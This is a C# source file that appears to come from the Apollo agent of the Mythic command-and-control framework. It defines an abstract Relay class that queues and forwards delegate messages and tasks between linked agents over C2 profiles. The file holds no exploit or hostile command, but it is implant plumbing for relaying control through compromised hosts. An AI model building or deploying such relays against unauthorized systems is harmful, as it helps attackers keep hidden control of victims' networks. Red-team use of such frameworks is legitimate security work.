using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Mythic.C2Profiles;
using Apollo.MessageInbox;
using System.Threading;
using static Utils.DebugUtils;
using System.Collections;

namespace C2Relays
{
    abstract public class Relay
    {
        internal int SleepTime;
        internal C2Profile MessageProducer;
        internal C2Profile MessageConsumer;
        public string AgentUUID;

        internal Thread MessageProducerThread;
        internal Thread MessageConsumerThread;

        //internal Mutex DelegateMessageRequestMutex = new Mutex();
        private Queue delegateMessageRequestQueue = new Queue();
        internal Queue SyncDelegateMessageRequestQueue;

        //internal Mutex DelegateMessageTaskMutex = new Mutex();
        private Queue delegateMessageTaskQueue = new Queue();
        internal Queue SyncDelegateMessageTaskQueue;

        internal string TaskID;

        internal bool isActive = false;

        public bool StopAllThreads = false;

        public Relay(C2Profile producer, C2Profile consumer, string taskID)
        {
            SyncDelegateMessageTaskQueue = Queue.Synchronized(delegateMessageTaskQueue);
            SyncDelegateMessageRequestQueue = Queue.Synchronized(delegateMessageRequestQueue);
            MessageProducer = producer;
            MessageConsumer = consumer;
            TaskID = taskID;
        }

        public bool IsActive()
        {
            return (MessageConsumerThread.IsAlive || MessageProducerThread.IsAlive) && isActive;
        }

        public string[] PopDelegateMessageTaskQueue()
        {
            string[] resp = new string[] { };
            if (SyncDelegateMessageTaskQueue.Count > 0)
            {
                lock(SyncDelegateMessageTaskQueue)
                {
                    resp = (string[])SyncDelegateMessageTaskQueue.ToArray();
                    SyncDelegateMessageTaskQueue.Clear();
                }
            }
            DebugWriteLine($"Returning {resp.Length} tasks.");
            return resp;
        }

        public void AddMessageToRequestQueue(string msg)
        {
            SyncDelegateMessageRequestQueue.Enqueue(msg);
        }

        public void AddMessageToTaskQueue(string msg)
        {
            SyncDelegateMessageTaskQueue.Enqueue(msg);
        }

        // This returns delegate dictionary required for POSTS involving delegate
        // messages.
        public Dictionary<string, string>[] PopDelegateMessageRequestQueue()
        {
            List<Dictionary<string, string>> delegateMessages = new List<Dictionary<string, string>>();
            DebugWriteLine($"Waiting to pop message request queue from Agent {AgentUUID}...");
            DebugWriteLine($"Wait lock acquired to pop message request queue from Agent {AgentUUID}!");
            if (SyncDelegateMessageRequestQueue.Count > 0)
            {
                lock(SyncDelegateMessageRequestQueue)
                {
                    foreach (string msg in SyncDelegateMessageRequestQueue)
                    {
                        delegateMessages.Add(new Dictionary<string, string> { { AgentUUID, msg } });
                    }
                    SyncDelegateMessageRequestQueue.Clear();
                }
            }
            DebugWriteLine($"Returning {delegateMessages.Count} message requests from Agent {AgentUUID}!");
            return delegateMessages.ToArray();
        }

        public void SetSleep(int newSleep)
        {
            SleepTime = newSleep;
        }

        public abstract bool SendMessageToProducer(string message);

        public abstract void ChangeConsumerProfile(C2Profile profile);

        public string SendMessageToConsumer(string message)
        {
            string result = "";
            string guid = Guid.NewGuid().ToString();
            DebugWriteLine($"Sending message (Message ID: {guid}) to Agent {AgentUUID}...");
            if (MessageConsumer.Send(guid, message))
            {
                DebugWriteLine($"Sent message (Message ID: {guid}) to Agent {AgentUUID}!");
                DebugWriteLine($"Waiting for message (Message ID: {guid}) from Agent {AgentUUID}...");
                result = (string)Inbox.GetMessage(guid);
                DebugWriteLine($"Received message (Message ID: {guid}) from Agent {AgentUUID}!");

            } else
            {
                DebugWriteLine($"ERROR! Failed to send message (Message ID: {guid}) to Agent {AgentUUID}!");
            }
            return result;
        }

        public void AddTaskToDelegateTaskQueue(string msg)
        {
            SyncDelegateMessageTaskQueue.Enqueue(msg);
        }

        public void AddTaskToDelegateTaskQueue(string[] msgs)
        {
            DebugWriteLine($"Adding several tasks to Agent {AgentUUID} delegate task queue...");
            foreach(var msg in msgs)
            {
                SyncDelegateMessageTaskQueue.Enqueue(msg);
            }
            DebugWriteLine($"Finished adding task to Agent {AgentUUID} delegate task queue!");
        }

        public void BeginRelay(string registrationGuidMsgID)
        {
            isActive = true;
        }

        public abstract void SendMessagesToProducers();

        public abstract void ReadMessagesFromProducer(string registrationGuidMsgID);

        //public abstract string InitializeRelay();

    }
}
